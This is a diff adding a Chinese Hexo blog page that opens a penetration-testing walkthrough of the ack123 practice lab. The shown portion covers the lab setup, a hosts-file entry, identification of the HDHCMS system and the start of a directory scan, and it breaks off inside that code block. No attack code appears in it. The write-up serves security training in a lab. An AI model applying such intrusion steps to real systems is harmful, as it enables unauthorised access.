@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//fastly.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"192.168.6.128","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ack123简介​    一个内网的综合靶场练习，提升个人单兵能力">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ack123">
+<meta property="og:url" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/index.html">
+<meta property="og:site_name" content="菜心">
+<meta property="og:description" content="ack123简介​    一个内网的综合靶场练习，提升个人单兵能力">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/1.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/2.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/3.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/4.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/5.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/6.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/7.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/8.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/9.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/10.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/11.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/12.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/13.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/14.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/15.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/16.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/17.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/18.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/19.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/20.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/21.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/22.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/23.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/24.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/25.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/26.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/27.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/28.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/29.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/30.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/31.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/32.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/33.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/34.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/35.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/36.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/37.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/38.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/39.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/40.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/41.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/42.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/43.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/44.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/45.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/46.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/47.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/48.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/49.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/50.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/51.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/52.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/53.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/54.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/55.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/56.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/57.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/58.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/59.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/60.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/61.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/62.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/63.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/64.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/65.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/66.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/67.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/68.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/69.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/70.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/71.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/72.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/73.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/74.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/75.png">
+<meta property="og:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/76.png">
+<meta property="article:published_time" content="2022-03-13T04:34:14.000Z">
+<meta property="article:modified_time" content="2023-06-15T16:11:05.593Z">
+<meta property="article:author" content="菜心">
+<meta property="article:tag" content="内网渗透测试">
+<meta property="article:tag" content="单兵能力">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/ack123/1.png">
+
+<link rel="canonical" href="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ack123 | 菜心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">菜心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://192.168.6.128/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar1.gif">
+      <meta itemprop="name" content="菜心">
+      <meta itemprop="description" content="目标&&付出">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="菜心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ack123
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-13 12:34:14" itemprop="dateCreated datePublished" datetime="2022-03-13T12:34:14+08:00">2022-03-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-06-16 00:11:05" itemprop="dateModified" datetime="2023-06-16T00:11:05+08:00">2023-06-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">内网靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/moonsec/" itemprop="url" rel="index"><span itemprop="name">moonsec</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>22k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>20 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="ack123"><a href="#ack123" class="headerlink" title="ack123"></a>ack123</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一个内网的综合靶场练习，提升个人单兵能力</p>
+<a id="more"></a>
+
+<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
+<li><p>kali2020</p>
+</li>
+<li><p>windows10</p>
+</li>
+<li><p>ack123</p>
+</li>
+</ul>
+<p>备注：其中ack123基础环境拓扑图如下:</p>
+<p><img data-src="./ack123/1.png" alt></p>
+<p>配置host如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.59.136 www.ackmoon.com</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="暴露公网web服务"><a href="#暴露公网web服务" class="headerlink" title="暴露公网web服务"></a>暴露公网web服务</h3><h4 id="web信息"><a href="#web信息" class="headerlink" title="web信息"></a>web信息</h4><ul>
+<li>首页如下，可以发现其<code>cms</code>为<code>HDHCMS</code></li>
+</ul>
+<p><img data-src="./ack123/2.png" alt></p>
+<ul>
+<li>目录扫描</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span 